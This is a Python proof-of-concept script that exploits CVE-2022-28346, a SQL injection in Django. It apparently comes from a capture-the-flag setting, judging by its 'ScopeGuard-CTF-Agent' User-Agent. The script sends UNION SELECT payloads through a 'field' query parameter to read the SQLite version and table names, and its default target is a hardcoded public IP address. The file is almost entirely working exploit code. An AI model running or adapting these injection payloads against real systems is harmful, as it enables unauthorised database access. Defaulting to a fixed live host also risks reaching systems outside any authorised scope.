#!/usr/bin/env python3
"""Reproduce CVE-2022-28346 against an explicitly supplied lab URL."""

from __future__ import annotations

import argparse
import hashlib
import html
import re
import urllib.parse
import urllib.request


VALUE_PATTERN = re.compile(
    r"<h3>Amoount of users:\s*(.*?)</h3>",
    re.IGNORECASE,
)


def fetch(base: str, field: str) -> tuple[int, str, str]:
    query = urllib.parse.urlencode({"field": field})
    url = f"{base.rstrip('/')}/demo/?{query}"
    request = urllib.request.Request(
        url,
        headers={"User-Agent": "ScopeGuard-CTF-Agent/0.1"},
        method="GET",
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        status = response.status
        body = response.read().decode("utf-8", errors="replace")
    return status, body, hashlib.sha256(body.encode()).hexdigest()


def values(body: str) -> list[str]:
    return [
        html.unescape(value).strip()
        for value in VALUE_PATTERN.findall(body)
    ]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://183.238.63.200:45714")
    args = parser.parse_args()

    cases = {
        "baseline": "admin",
        "version": (
            'demo.name" FROM "demo_user" '
            'union SELECT "1",sqlite_version(),"3" -- '
        ),
        "schema": (
            'demo.name" FROM "demo_user" '
            "union SELECT 1,name,3 FROM sqlite_master -- "
        ),
    }

    for name, field in cases.items():
        status, body, digest = fetch(args.base, field)
        print(f"{name}: status={status} sha256={digest}")
        print(f"{name}: values={values(body)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
